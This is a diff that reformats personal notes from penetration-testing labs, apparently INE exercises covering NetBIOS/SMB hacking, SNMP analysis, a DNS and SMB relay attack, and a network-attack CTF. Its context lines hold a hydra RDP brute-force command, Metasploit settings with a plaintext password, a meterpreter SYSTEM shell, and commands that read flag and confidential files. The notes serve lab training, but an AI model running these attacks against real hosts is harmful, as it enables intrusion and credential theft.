@@ -1,6 +1,5 @@
-NetBIOS Hacking
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-=> SMB http://demo.ine.local and http://demo1.ine.local
+# NetBIOS Hacking
+	=> SMB http://demo.ine.local and http://demo1.ine.local
 
 	ping demo.ine.local
 		64 bytes from demo.ine.local (10.0.24.78): icmp_seq=1 ttl=125 time=2.78 ms
@@ -103,10 +102,7 @@ NetBIOS Hacking
 	CTRL + C
 	cat D:\\Confidential.txt
 	cat D:\\FLAG2.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-SNMP Analysis
-http://demo.ine.local
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# SNMP Analysis
 	nmap -sV -sC demo.ine.local
 	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3389
 
@@ -147,8 +143,7 @@ http://demo.ine.local
 		set SMBUSER administrator
 		set SMBPASS elizabeth
 		exploit
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-DNS & SMB Relay Attack
+# DNS & SMB Relay Attack
 	client : 172.16.5.5
 	Attacker Machine : 172.16.5.101
 	Target Machine : 172.16.5.10
@@ -192,9 +187,7 @@ DNS & SMB Relay Attack
 	meterpreter > getuid
 	Server username: NT AUTHORITY\SYSTEM
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Host & Network Penetration Testing: Network-Based Attacks CTF 1
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# Host & Network Penetration Testing: Network-Based Attacks CTF 1
 	識別返回 200 OK 回應代碼
 	過濾器：http.response.code == 200
 
@@ -234,6 +227,5 @@ Host & Network Penetration Testing: Network-Based Attacks CTF 1
 	=> Follow => TCP stream
 	=> Find coinbase
 	hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
